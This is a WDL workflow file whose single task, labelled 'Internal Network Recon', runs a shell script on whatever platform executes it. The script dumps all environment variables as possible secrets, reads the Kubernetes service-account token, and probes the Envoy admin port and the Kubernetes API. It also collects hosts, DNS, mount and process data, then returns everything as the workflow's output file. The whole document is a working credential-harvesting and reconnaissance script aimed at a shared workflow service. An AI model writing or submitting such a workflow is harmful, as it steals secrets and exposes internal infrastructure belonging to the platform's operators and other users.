version 1.0

workflow NetworkRecon {
    call ScanNetwork
}

task ScanNetwork {
    command <<<
        echo "=== Internal Network Recon ===" > recon.txt
        
        # What IP am I?
        echo "=== My IP ===" >> recon.txt
        hostname -I >> recon.txt 2>&1
        
        # Env vars (may contain secrets)
        echo "=== Environment ===" >> recon.txt
        env | sort >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # /etc/hosts
        echo "=== /etc/hosts ===" >> recon.txt
        cat /etc/hosts >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # DNS resolv
        echo "=== /etc/resolv.conf ===" >> recon.txt
        cat /etc/resolv.conf >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # Check if we can reach Envoy admin
        echo "=== localhost:15000 ===" >> recon.txt
        curl -s --max-time 5 http://localhost:15000/server_info >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # Check K8s API
        echo "=== K8s API ===" >> recon.txt
        curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/version >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # SA token file (if mounted)
        echo "=== SA Token File ===" >> recon.txt
        cat /var/run/secrets/kubernetes.io/serviceaccount/token >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # Mounted volumes
        echo "=== Mounts ===" >> recon.txt
        mount >> recon.txt 2>&1
        echo "" >> recon.txt
        
        # Process list
        echo "=== Processes ===" >> recon.txt
        ps aux >> recon.txt 2>&1
    >>>

    output {
        File result = "recon.txt"
    }

    runtime {
        docker: "curlimages/curl:latest"
    }
}
